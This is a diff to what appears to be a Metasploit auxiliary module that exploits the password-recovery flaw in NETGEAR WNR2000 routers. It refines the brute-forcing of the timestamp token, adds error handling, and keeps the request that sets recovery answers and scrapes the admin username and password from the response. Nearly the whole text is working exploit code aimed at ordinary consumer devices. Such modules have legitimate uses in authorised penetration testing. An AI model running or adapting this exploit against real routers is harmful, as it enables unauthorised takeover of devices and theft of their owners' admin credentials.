@@ -18,9 +18,11 @@ class MetasploitModule < Msf::Auxiliary
         The NETGEAR WNR2000 router has a vulnerability in the way it handles password recovery.
         This vulnerability can be exploited by an unauthenticated attacker who is able to guess
         the value of a certain timestamp which is in the configuration of the router.
+        Bruteforcing the timestamp token might take a few minutes, a few hours, or days, but
+        it is guaranteed that it can be bruteforced.
         This module works very reliably and it has been tested with the WNR2000v5, firmware versions
-        1.0.0.34 and 1.0.0.18. It should also work with the v4 and v3, but this has not been tested
-        with these versions.
+        1.0.0.34 and 1.0.0.18. It should also work with the hardware revisions v4 and v3, but this
+        has not been tested.
       },
       'Author' =>
         [
@@ -128,6 +130,9 @@ class MetasploitModule < Msf::Auxiliary
 
     if res && res.body =~ /Admin Password: (.*)<\/TD>/
       password = $1
+      if password.nil? or password == ""
+        fail_with(Failure::Unknown, "#{peer} - Failed to obtain password! Perhaps security questions were already set?")
+      end
     else
       fail_with(Failure::Unknown, "#{peer} - Failed to obtain password")
     end
@@ -153,7 +158,7 @@ class MetasploitModule < Msf::Auxiliary
           'data'    => "submit_flag=passwd&hidden_enable_recovery=1&Apply=Apply&sysOldPasswd=&sysNewPasswd=&sysConfirmPasswd=&enable_recovery=on&question1=1&answer1=#{@q1}&question2=2&answer2=#{@q2}"
       })
       return res
-    rescue ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
+    rescue ::Errno::ETIMEDOUT, ::Errno::ECONNRESET, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
       return
     end
   end
@@ -205,17 +210,17 @@ class MetasploitModule < Msf::Auxiliary
         res = send_req(timestamp)
         if res && res.code == 200
           credentials = get_creds
-          print_good("#{peer} - Success! Got admin username #{credentials[0]} and password #{credentials[1]}")
+          print_good("#{peer} - Success! Got admin username \"#{credentials[0]}\" and password \"#{credentials[1]}\"")
           return
         end
       end
-      if start_time == 0
-        # for the special case when the router resets the date to 1 Jan 1970
-        start_time = end_time - (datastore['TIME_SURPLUS'])
-        end_time += datastore['TIME_OFFSET']
-      else
-        end_time = start_time
-        start_time -= datastore['TIME_OFFSET']
+      end_time = start_time
+      start_time -= datastore['TIME_OFFSET']
+      if start_time < 0
+        if end_time <= datastore['TIME_OFFSET']
+          fail_with(Failure::Unknown, "#{peer} - Exploit failed.")
+        end
+        start_time = 0
       end
       print_status("#{peer} - Going for another round, finishing at #{start_time} and starting at #{end_time}")
 
